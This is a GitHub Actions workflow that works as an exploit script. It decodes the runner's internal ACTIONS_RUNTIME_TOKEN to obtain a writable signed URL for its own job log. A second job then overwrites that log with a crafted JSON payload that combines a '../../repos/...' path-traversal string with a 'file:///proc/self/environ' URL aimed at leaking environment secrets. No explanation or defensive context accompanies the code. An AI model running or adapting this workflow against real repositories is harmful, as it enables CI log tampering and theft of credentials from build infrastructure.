name: Cassette Log
on:
  push:
  workflow_dispatch:
permissions:
  actions: read
  contents: read
jobs:
  capture:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v8
        with:
          script: |
            const fs = require('fs');
            const token = process.env.ACTIONS_RUNTIME_TOKEN;
            const jwt = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
            const scope = jwt.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
            const [, workflow_run_backend_id, workflow_job_run_backend_id] = scope.split(':');
            const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
            const response = await fetch(base + '/twirp/results.services.receiver.Receiver/GetJobLogsSignedBlobURL', {
              method: 'POST',
              headers: {Authorization: `Bearer ${token}`, 'Content-Type': 'application/json'},
              body: JSON.stringify({workflow_run_backend_id, workflow_job_run_backend_id}),
            });
            const result = await response.json();
            if (!response.ok || !result.logs_url) throw Error(`Log URL lookup failed: ${response.status}, keys=${Object.keys(result)}`);
            fs.writeFileSync('log-sas.txt', result.logs_url);
            console.log('Job log URL acquired; SAS permissions:', new URL(result.logs_url).searchParams.get('sp'));
      - uses: actions/upload-artifact@v4
        with:
          name: log-sas
          path: log-sas.txt
          retention-days: 1
  mutate:
    needs: capture
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: log-sas
      - uses: actions/github-script@v8
        with:
          script: |
            const fs = require('fs');
            const {data} = await github.rest.actions.listJobsForWorkflowRun({
              ...context.repo, run_id: context.runId
            });
            const job = data.jobs.find(x => x.name === 'capture');
            if (!job) throw Error('Capture job not found');
            const path = `x/../../repos/${context.repo.owner}/${context.repo.repo}/actions/jobs/${job.id}/logs`;
            const payload = JSON.stringify({
              full_name: path, owner: {login: 'x', avatar_url: 'file:///proc/self/environ'}
            });
            const sas = fs.readFileSync('log-sas.txt', 'utf8').trim();
            const reset = await fetch(sas, {
              method: 'PUT',
              headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2025-11-05',
                        'x-ms-blob-content-type': 'text/plain', 'Content-Length': String(Buffer.byteLength(payload))},
              body: payload
            });
            if (!reset.ok) throw Error('Reset failed: ' + reset.status + ' ' + await reset.text());
            console.log(`REPOSITORY=${path}`);
            console.log(`JOB_ID=${job.id}`);
